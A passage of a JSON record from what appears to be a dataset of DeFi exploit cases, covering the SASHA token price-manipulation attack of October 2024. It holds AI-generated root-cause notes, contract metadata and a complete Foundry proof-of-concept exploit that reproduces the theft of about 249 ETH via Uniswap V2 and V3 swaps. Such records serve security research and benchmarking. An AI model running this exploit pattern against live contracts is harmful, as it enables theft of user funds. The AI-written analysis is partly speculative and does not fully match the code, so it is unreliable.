age controls. 2. The attacker then transferred a portion of these newly acquired SASHA tokens to a specific Uniswap V2 pool (SASHA/21). 3. Finally, the attacker performed a swap on Uniswap V3, selling SASHA for WETH. By exploiting the price imbalance created on Uniswap V2 and potentially other pools, the attacker was able to sell SASHA at an artificially inflated price on Uniswap V3, thereby extracting a large amount of WETH. The contract's `swapEnable` and `opentrade` flags, along with the `swapTokensAtAmount` and `auto1`/`auto2` mappings, suggest that the token contract itself is designed to facilitate such swaps and potentially profit from them, but the attacker found a way to exploit this mechanism.", "ai_mitigation": [], "ai_root_cause": "Price manipulation vulnerability in the SASHA token's trading mechanism. The token's design, particularly its reliance on automated swaps and the `swapTokensAtAmount` threshold, combined with potentially low liquidity in its trading pairs, allowed the attacker to significantly influence the token's price. The attacker exploited this by first buying a large amount of SASHA on Uniswap V2, inflating its price, and then selling it at this inflated price on Uniswap V3.", "ai_vulnerability_type": "Price Manipulation", "attack_title": "Tx : https://app.blocksec.com/explorer/tx/eth/0xd9fdc7d03eec28fc2453c5fa68eff82d4c297f436a6a5470c54ca3aecd2db17e", "contracts": [{"abi_available": true, "address": "0xd1456d1b9ceb59abd4423a49d40942a9485ceef6", "artifact_dir": "data/contracts/2024_10_sashatoken/contracts/01_vulnerable_d1456d1b_sasha", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.25+commit.b61c2a91", "contract_name": "SASHA", "explorer_url": "https://etherscan.io/address/0xd1456d1b9ceb59abd4423a49d40942a9485ceef6", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:41:40.932Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2024_10_sashatoken/contracts/01_vulnerable_d1456d1b_sasha/source.sol"], "source_hint": "AI extracted: The SASHA token contract is vulnerable to a flash loan attack or a similar exploit that allows an attacker to manipulate its price on decentralized exchanges, leading to significant loss of funds.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_10_sashatoken", "id": "2024_10_sashatoken", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:41:45.360Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~249 ETH (~$600K USD)
// Attacker : 0x493c5655D40B051a64bc88A6af21D73d3A9B72A2 (Shezmu Attacker 3)
// Attack Contract : https://etherscan.io/address/0x991493900674b10bdf54bdfe95b4e043257798cf
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xd9fdc7d03eec28fc2453c5fa68eff82d4c297f436a6a5470c54ca3aecd2db17e

// @Analysis


// Contracts involved
address constant SASHA = 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2_Router2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV3_Router2 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
address constant UniswapV2_SASHA21 = 0xB23FC1241e1Bc1a5542a438775809d38099838fe;

contract SASHAToken_exp is Test {
    address attacker = 0x81F48A87Ec44208c691f870b9d400D9c13111e2E;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_905_302 - 1);

        vm.label(SASHA, "SASHA");
        vm.label(weth, "WETH");
        vm.label(UniswapV2_Router2, "Uniswap V2: Router 2");
        vm.label(UniswapV3_Router2, "Uniswap V3: Router 2");
        vm.label(UniswapV2_SASHA21, "Uniswap V2: SASHA 21");

        vm.label(attacker, "Attacker");

        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        SASHAToken_AttackContract attackC = new SASHAToken_AttackContract();
        payable(address(attackC)).transfer(0.08 ether);

        attackC.attack();

        // Simulate withdraw
        attackC.withdraw();

        vm.stopPrank();

        console.log("balance: ", attacker.balance - 1 ether);
    }

    fallback() external payable {}
}

contract SASHAToken_AttackContract {
    address payable public attacker;

    constructor() public {
        attacker = payable(msg.sender);
    }

    function attack() public {
        // Approve
        IWETH(payable(weth)).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV2_Router2, type(uint256).max);
        IERC20(SASHA).approve(UniswapV3_Router2, type(uint256).max);

        // Deposit
        IWETH(payable(weth)).deposit{value: 0.07 ether}();

        // Swap
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = SASHA;
        Uni_Router_V2(UniswapV2_Router2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            70_000_000_000_000_000, // amountIn
            1, // amountOutMin
            path, // path
            address(this), // to
            4_324_324_234_244 // deadline
        );

        // console.log("SASHA balance: ", IERC20(SASHA).balanceOf(address(this)));

        IERC20(SASHA).transfer(UniswapV2_SASHA21, 1_000_000_000_000_000_000);

        UniswapV3Router.ExactInputSingleParams memory params = UniswapV3Router.ExactInputSingleParams({
            tokenIn: SASHA,
            tokenOut: weth,
            fee: 10_000,
            recipient: address(this),
            amountIn: 99_000_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        UniswapV3Router(UniswapV3_Router2).exactInputSingle(params);

        IWETH(payable(weth)).withdraw(249_276_511_929_373_786_924);

        // console.log("balance: ", address(this).balance);
    }

    fallback() external payable {
        // payable(attacker).transfer(address(this).balance);
    }

    function withdraw() public payable {
        require(msg.sender == attacker, "Not the contract owner");

        attacker.transfer(address(this).balance);
    }
}

interface UniswapV3Router is IERC20 {
    // Uniswap V3: SwapRouter
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}
